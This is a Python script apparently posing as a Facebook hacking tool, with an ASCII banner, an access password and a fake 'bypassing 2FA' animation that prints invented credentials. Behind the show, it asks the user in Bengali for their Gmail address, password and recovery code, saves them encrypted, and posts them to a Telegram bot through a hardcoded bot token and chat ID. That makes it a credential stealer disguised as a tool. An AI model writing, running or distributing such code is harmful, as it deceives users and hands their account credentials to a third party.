import os
import time
import getpass
import requests
from cryptography.fernet import Fernet
from colorama import init, Fore

init(autoreset=True)

BOT_TOKEN = "8019634294:AAE8TRGISBGxHHNrh4TyctpBOYmPRzu1b54"
CHAT_ID = "6423238949"

key_file = "key.key"
data_file = "data.enc"

def banner():
    os.system("clear")
    print(r"""
    _____            ____  _    _          _____  
 |  __ \     /\   / __ \| |  | |   /\   |  __ \ 
 | |__) |   /  \ | |  | | |__| |  /  \  | |  | |
 |  _  /   / /\ \| |  | |  __  | / /\ \ | |  | |
 | | \ \  / ____ \ |__| | |  | |/ ____ \| |__| |
 |_|  \_\/_/    \_\____/|_|  |_/_/    \_\_____/
            """)
    print("              Powered by: Void X Raven\n")

def fake_hack_display():
    tasks = [
        "Connecting to Facebook server...",
        "Bypassing 2FA...",
        "Injecting payload...",
        "Extracting credentials...",
        "Decrypting hashes...",
        "Success! Dumping credentials...\n"
    ]
    for task in tasks:
        print(Fore.GREEN + "[*] " + task)
        time.sleep(0.8)
    print(Fore.YELLOW + "User: rafik_2021\nPass: goruKhaici123")

def send_to_telegram(msg):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": msg
    }
    requests.post(url, data=payload)

def generate_key():
    key = Fernet.generate_key()
    with open(key_file, "wb") as f:
        f.write(key)

def load_key():
    return open(key_file, "rb").read()

def encrypt_data(data, key):
    return Fernet(key).encrypt(data.encode())

def decrypt_data(data, key):
    return Fernet(key).decrypt(data).decode()

# Init
if not os.path.exists(key_file):
    generate_key()

key = load_key()
fernet = Fernet(key)

# Show banner
banner()

# Ask for password
access_pass = getpass.getpass("Access Password দিন: ")

if access_pass.strip() != "Void X Raven":
    print(Fore.RED + "wrong password, fuck you")
    exit()

# Show fake hack simulation
fake_hack_display()

# Send real data to Telegram
if os.path.exists(data_file):
    try:
        with open(data_file, "rb") as f:
            encrypted = f.read()
        decrypted = decrypt_data(encrypted, key)
        send_to_telegram(f"RAOHAD's Secret Info:\n\n{decrypted}")
    except:
        send_to_telegram("Data decryption failed.")
else:
    gmail = input("তোমার জিমেইলঃ ")
    gmail_pass = getpass.getpass("পাসওয়ার্ডঃ ")
    recovery = input("রিকভারি কোড/নাম্বারঃ ")

    full_data = f"Gmail: {gmail}\nPassword: {gmail_pass}\nRecovery: {recovery}"
    encrypted = encrypt_data(full_data, key)

    with open(data_file, "wb") as f:
        f.write(encrypted)

    send_to_telegram("RAOHAD's info saved successfully.")